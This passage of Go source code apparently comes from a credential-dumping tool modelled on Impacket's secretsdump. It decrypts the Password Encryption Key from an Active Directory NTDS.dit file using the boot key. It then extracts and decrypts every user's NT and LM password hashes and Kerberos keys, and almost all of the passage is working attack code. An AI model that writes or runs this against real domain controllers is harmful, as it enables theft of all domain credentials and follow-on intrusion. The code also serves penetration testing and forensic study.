	// Find the pekList attribute in datatable
	// Column ATTk590689 contains pekList
	// Schema column names:
	// - ATTm590045 = sAMAccountName
	// - ATTk590689 = pekList
	// - ATTk589879 = unicodePwd (encrypted NT hash)
	// - ATTk589984 = supplementalCredentials

	for i := 0; i < datatable.NumRecords(); i++ {
		record, err := datatable.GetRecord(i)
		if err != nil {
			continue
		}

		// Look for pekList column
		pekData := record.GetColumn("ATTk590689")
		if pekData == nil || len(pekData) == 0 {
			continue
		}

		// Decrypt PEK
		return decryptPEK(pekData, bootKey)
	}

	return nil, fmt.Errorf("pekList not found in datatable")
}

// decryptPEK decrypts the Password Encryption Key list
func decryptPEK(encPEK, bootKey []byte) ([]byte, error) {
	if len(encPEK) < 44 {
		return nil, fmt.Errorf("encrypted PEK too short: %d", len(encPEK))
	}

	// PEKLIST_ENC structure:
	// [0:8]   Header (version + flags)
	// [8:24]  KeyMaterial (16 bytes) - used as IV for AES
	// [24:]   EncryptedPek

	// Check for new format (Win 2016+)
	// Version 3 uses AES with bootKey directly, Version 2 uses RC4
	version := binary.LittleEndian.Uint32(encPEK[0:4])

	if version == 3 {
		// AES encrypted (Windows Server 2016+)
		// For version 3, use bootKey directly as AES key, KeyMaterial as IV
		keyMaterial := encPEK[8:24]
		encData := encPEK[24:]
		return decryptPEKAES(encData, bootKey, keyMaterial)
	}

	// RC4 encrypted (older Windows)
	// For version 2, use MD5(bootKey || salt * 1000) as RC4 key
	salt := encPEK[8:24]
	encData := encPEK[24:]
	return decryptPEKRC4(encData, bootKey, salt)
}

func decryptPEKAES(encData, bootKey, keyMaterial []byte) ([]byte, error) {
	// For Windows 2016+ (version 3), Impacket uses:
	// - bootKey directly as AES-128 key (NOT PBKDF2!)
	// - keyMaterial as IV
	// - encData as ciphertext

	// AES-CBC decrypt with bootKey as key, keyMaterial as IV
	block, err := aes.NewCipher(bootKey)
	if err != nil {
		return nil, err
	}

	decrypted := make([]byte, len(encData))
	mode := cipher.NewCBCDecrypter(block, keyMaterial)
	mode.CryptBlocks(decrypted, encData)

	// Parse PEKLIST_PLAIN structure: Header(32) + DecryptedPek
	// DecryptedPek contains entries of: index(4) + pek(16) = 20 bytes each
	if len(decrypted) < 52 {
		return nil, fmt.Errorf("decrypted PEK blob too short: %d", len(decrypted))
	}

	// Skip 32-byte header, then parse first entry: index(4) + pek(16)
	pekEntries := decrypted[32:]
	if len(pekEntries) < 20 {
		return nil, fmt.Errorf("no PEK entries found")
	}

	// First entry's PEK is at offset 4 (after 4-byte index)
	index := binary.LittleEndian.Uint32(pekEntries[0:4])
	pek := pekEntries[4:20]

	// Verify index is 0 (first entry)
	if index != 0 {
		return nil, fmt.Errorf("unexpected PEK index: %d", index)
	}

	return pek, nil
}

func decryptPEKRC4(encData, bootKey, salt []byte) ([]byte, error) {
	// Key: MD5(bootKey || salt * 1000)
	key := registry.MD5With1000Rounds(bootKey, salt)

	// RC4 decrypt
	decrypted := registry.RC4Decrypt(key, encData)

	// PEK is at offset 36 in decrypted data, 16 bytes
	if len(decrypted) < 52 {
		return nil, fmt.Errorf("decrypted PEK too short")
	}

	return decrypted[36:52], nil
}

func extractNTDSHashes(datatable *ese.Table, pek []byte) ([]ntdsUser, []ntdsKerbKey) {
	var users []ntdsUser
	var kerberosKeys []ntdsKerbKey

	for i := 0; i < datatable.NumRecords(); i++ {
		record, err := datatable.GetRecord(i)
		if err != nil {
			continue
		}

		// Get SAM account name (UTF-16LE encoded)
		samAccountName := record.GetColumnString("ATTm590045")
		if samAccountName == "" {
			continue
		}

		// Get SID (for RID extraction)
		sidData := record.GetColumn("ATTr589970")
		if sidData == nil {
			continue
		}
		rid := extractRIDFromSID(sidData)

		// Get encrypted NT hash (ATTk589914 = unicodePwd, NOT ATTk589879!)
		ntHashEnc := record.GetColumn("ATTk589914")
		// Get encrypted LM hash (ATTk589913 = dBCSPwd)
		lmHashEnc := record.GetColumn("ATTk589913")

		lmHash := "aad3b435b51404eeaad3b435b51404ee"
		ntHash := "31d6cfe0d16ae931b73c59d7e0c089c0"

		if len(ntHashEnc) > 0 {
			decrypted, err := decryptNTDSHash(ntHashEnc, pek, rid)
			if err == nil && len(decrypted) == 16 {
				ntHash = hex.EncodeToString(decrypted)
			}
		}

		if len(lmHashEnc) > 0 {
			decrypted, err := decryptNTDSHash(lmHashEnc, pek, rid)
			if err == nil && len(decrypted) == 16 {
				lmHash = hex.EncodeToString(decrypted)
			}
		}

		// Get supplemental credentials (Kerberos keys)
		suppCreds := record.GetColumn("ATTk589949")
		if len(suppCreds) > 0 {
			decryptedSupp, err := decryptSupplementalCredentials(suppCreds, pek)
			if err == nil {
				keys, _ := drsuapi.ParseSupplementalCredentials(decryptedSupp)
				for _, key := range keys {
					kerberosKeys = append(kerberosKeys, ntdsKerbKey{
						username: samAccountName,
						keyType:  drsuapi.GetKeyTypeName(key.KeyType),
						keyValue: hex.EncodeToString(key.KeyValue),
					})
				}
			}
		}

		users = append(users, ntdsUser{
			SAMAccountName: samAccountName,
			RID:            rid,
			LMHash:         lmHash,
			NTHash:         ntHash,
		})
	}

	return users, kerberosKeys
}

func extractRIDFromSID(sid []byte) uint32 {
	if len(sid) < 8 {
		return 0
	}
	// SID structure: revision(1), subAuthCount(1), identAuth(6), subAuths(4*count)
	// RID is the last subAuthority (4 bytes)
	// Note: In NTDS.DIT, the objectSid bytes appear to be stored with the RID in big-endian
	return binary.BigEndian.Uint32(sid[len(sid)-4:])
}

func decryptNTDSHash(encHash, pek []byte, rid uint32) ([]byte, error) {
	if len(encHash) < 24 {
		return nil, fmt.Errorf("encrypted hash too short")
	}

	// Decrypt with PEK first (outer layer)
	decrypted, err := decryptWithPEK(encHash, pek)
	if err != nil {
		return nil, err
	}

	// After PEK decryption, structure depends on version
	// For AES (version 19), the decrypted data contains:
	// [0:16] - encrypted hash (to be decrypted with RID-based DES)
	// For RC4 (version 1), structure is similar

	if len(decrypted) < 16 {
		return nil, fmt.Errorf("decrypted data too short: %d", len(decrypted))
	}

	// Decrypt with RID-based DES (inner layer)
	// The encrypted hash is 16 bytes, decrypted using two DES operations with RID-derived keys
	return registry.DecryptNTDSHashWithRID(decrypted[:16], rid)
}

func decryptWithPEK(data, pek []byte) ([]byte, error) {
	if len(data) < 24 {
		return nil, fmt.Errorf("data too short for PEK decryption")
	}

	// Check version at offset 0
	version := binary.LittleEndian.Uint32(data[0:4])

	if version == 0x13 { // Version 19 = AES encryption (Windows 2016+)
		// CRYPTED_HASHW16 structure:
		// [0:8]   Header (version + flags)
		// [8:24]  KeyMaterial (16 bytes) - used as IV
		// [24:28] Unknown (4 bytes)
		// [28:]   EncryptedHash

		if len(data) < 44 {
			return nil, fmt.Errorf("encrypted hash data too short for AES path")
		}

		keyMaterial := data[8:24]
		encryptedHash := data[28:]

		// AES-CBC decrypt with PEK as key, KeyMaterial as IV
		block, err := aes.NewCipher(pek)
		if err != nil {
			return nil, err
		}

		if len(encryptedHash) < 16 {
			return nil, fmt.Errorf("encrypted hash too short")
		}

		decrypted := make([]byte, 16)
		mode := cipher.NewCBCDecrypter(block, keyMaterial)
		mode.CryptBlocks(decrypted, encryptedHash[:16])

		return decrypted, nil
	}

	// Version 1 = RC4 encryption (older Windows)
	// CRYPTED_HASH structure:
	// [0:8]   Header
	// [8:24]  KeyMaterial (16 bytes)
	// [24:]   EncryptedHash
	if len(data) < 40 {
		return nil, fmt.Errorf("RC4 encrypted data too short")
	}

	keyMaterial := data[8:24]
	encryptedHash := data[24:]

	// Derive RC4 key: MD5(PEK + KeyMaterial)
	h := md5.New()
	h.Write(pek)
	h.Write(keyMaterial)
	rc4Key := h.Sum(nil)

	// RC4 decrypt
	decrypted := registry.RC4Decrypt(rc4Key, encryptedHash)
	if len(decrypted) >= 16 {
		return decrypted[:16], nil
	}
	return decrypted, nil
}

func decryptSupplementalCredentials(encData, pek []byte) ([]byte, error) {
	if len(encData) < 28 {
		return nil, fmt.Errorf("supplementalCredentials too short")
	}

	version := binary.LittleEndian.Uint32(encData[0:4])

	if version == 0x13 { // Version 19 = AES encryption (Windows 2016+)
		// Structure:
		// [0:8]   Header
		// [8:24]  KeyMaterial (16 bytes) - used as IV
		// [24:28] Unknown (4 bytes)
		// [28:]   EncryptedData

		keyMaterial := encData[8:24]
		encryptedData := encData[28:]

		// AES-CBC decrypt with PEK as key, KeyMaterial as IV
		block, err := aes.NewCipher(pek)
		if err != nil {
			return nil, err
		}

		// Ensure encrypted data is block-aligned
		if len(encryptedData)%16 != 0 {
			return nil, fmt.Errorf("encrypted data not block-aligned")
		}

		decrypted := make([]byte, len(encryptedData))
		mode := cipher.NewCBCDecrypter(block, keyMaterial)
		mode.CryptBlocks(decrypted, encryptedData)

		// Remove PKCS7 padding if present
		if len(decrypted) > 0 {
			padLen := int(decrypted[len(decrypted)-1])
			if padLen > 0 && padLen <= 16 && padLen <= len(decrypted) {
				// Verify padding
				valid := true
				for i := 0; i < padLen; i++ {
					if decrypted[len(decrypted)-1-i] != byte(padLen) {
						valid = false
						break
					}
				}
				if valid {
					decrypted = decrypted[:len(decrypted)-padLen]
				}
			}
		}

		return decrypted, nil
	}

	// Version 1 = RC4 encryption (older Windows)
	// Structure:
	// [0:8]   Header
	// [8:24]  KeyMaterial (16 bytes)
	// [24:]   EncryptedData

	keyMaterial := encData[8:24]
	encryptedData := encData[24:]

	// Derive RC4 key: MD5(PEK + KeyMaterial)
	h := md5.New()
	h.Write(pek)
	h.Write(keyMaterial)
	rc4Key := h.Sum(nil)

	// RC4 decrypt
	return registry.RC4Decrypt(rc4Key, encryptedData), nil
}
